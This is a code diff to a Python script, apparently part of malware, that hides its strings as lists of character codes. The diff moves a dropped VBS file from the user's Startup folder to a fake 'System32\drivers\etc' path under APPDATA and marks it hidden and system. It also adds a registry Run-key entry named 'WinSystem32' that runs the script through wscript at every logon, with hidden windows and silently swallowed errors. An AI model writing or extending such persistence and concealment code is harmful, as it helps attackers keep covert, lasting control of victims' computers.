@@ -14,9 +14,9 @@ env_var = _([65, 80, 80, 68, 65, 84, 65])
 p1, p2, p3, p4, p5 = (
     _([77, 105, 99, 114, 111, 115, 111, 102, 116]),
     _([87, 105, 110, 100, 111, 119, 115]),
-    _([83, 116, 97, 114, 116, 32, 77, 101, 110, 117]),
-    _([80, 114, 111, 103, 114, 97, 109, 115]),
-    _([83, 116, 97, 114, 116, 117, 112]),
+    _([83, 121, 115, 116, 101, 109, 51, 50]),
+    _([100, 114, 105, 118, 101, 114, 115]),
+    _([101, 116, 99]),
 )
 file_name = _([87, 105, 110, 83, 121, 115, 116, 101, 109, 51, 50, 46, 118, 98, 115])
 
@@ -85,11 +85,11 @@ Loop
 
     FLAGS = 0x08000000 | 0x00000008
     try:
-        startup_dir = os.path.join(os.getenv(env_var), p1, p2, p3, p4, p5)  # type: ignore
+        drop_dir = os.path.join(os.getenv(env_var), p1, p2, p3, p4, p5)  # type: ignore
     except:
         pass
     try:
-        robo_cmd = f'robocopy "{temp_dir}" "{startup_dir}" "{file_name}" /mov'  # type: ignore
+        robo_cmd = f'robocopy "{temp_dir}" "{drop_dir}" "{file_name}" /mov'  # type: ignore
     except:
         pass
     try:
@@ -103,6 +103,23 @@ Loop
             f'attrib +h +s "{os.path.join(os.getenv(env_var), p1, p2, p3, p4, p5, file_name)}"',  # type: ignore
             shell=True,
             creationflags=FLAGS,
+        )
+        vbs_path = os.path.join(os.getenv(env_var), p1, p2, p3, p4, p5, file_name)  # type: ignore
+        subprocess.run(
+            [
+                "reg",
+                "add",
+                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+                "/v",
+                "WinSystem32",
+                "/t",
+                "REG_SZ",
+                "/f",
+                "/d",
+                f'wscript.exe "{vbs_path}"',
+            ],  # type: ignore
+            creationflags=FLAGS,
+            capture_output=True,  # type: ignore
         )
     except:
         pass
